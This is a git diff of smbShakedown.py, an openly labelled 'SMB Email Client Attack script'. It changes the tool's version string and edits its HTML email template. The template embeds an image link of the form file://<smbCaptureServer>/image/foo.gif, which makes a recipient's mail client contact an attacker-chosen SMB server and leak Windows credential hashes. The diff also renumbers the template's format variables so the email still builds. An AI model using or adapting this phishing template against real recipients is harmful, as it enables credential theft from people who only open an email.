@@ -35,7 +35,7 @@ banner = colors.x + r"""
     \/_____/\/_/\/_/\/__/\/_/ \/_/\/_/\/____/\/__,_ /\/___/  \/__//__/   \/_/\/_/
 
 """+'\n' \
-+ colors.x + '\n smbShakedown.py v1.9142016' \
++ colors.x + '\n smbShakedown.py v1.9112016' \
 + colors.normal + '\n Description: A simplified SMB Email Client Attack script.'\
 + colors.normal + '\n Created by: Nick Sanzotta/@beamr' + '\n'\
 + colors.normal + ' ' + '*' * 95 +'\n' + colors.normal
@@ -140,9 +140,9 @@ def main():
 		print('ENTERED:' "%s" % recipientAddress + "\n")
 
 ### EDIT: Email Message Template Below ###
-### Becareful not to remove the variables {0},{1},{2},{3} and {4} ###
+### Becareful not to remove the variables {0},{1},{2} and {3} ###
 	message = """From: {0} <{1}>
-To: {2} <{3}>
+To: {2}
 MIME-Version: 1.0
 Content-type: text/html
 Subject: smbShakedown.py test.
@@ -151,10 +151,10 @@ Subject: smbShakedown.py test.
 ...
 <b>smbShakedown.py test message.</b>
 <br>
-<img src=file://{4}/image/foo.gif>
+<img src=file://{3}/image/foo.gif>
 """
 ##########################################################
-	emailMessage = message.format(senderName, senderAddress, recipientName, recipientAddress, smbCaptureServer)
+	emailMessage = message.format(senderName, senderAddress, recipientName, smbCaptureServer)
 	print('Email Message Template Below:')
 	time.sleep(1)
 	print(emailMessage)
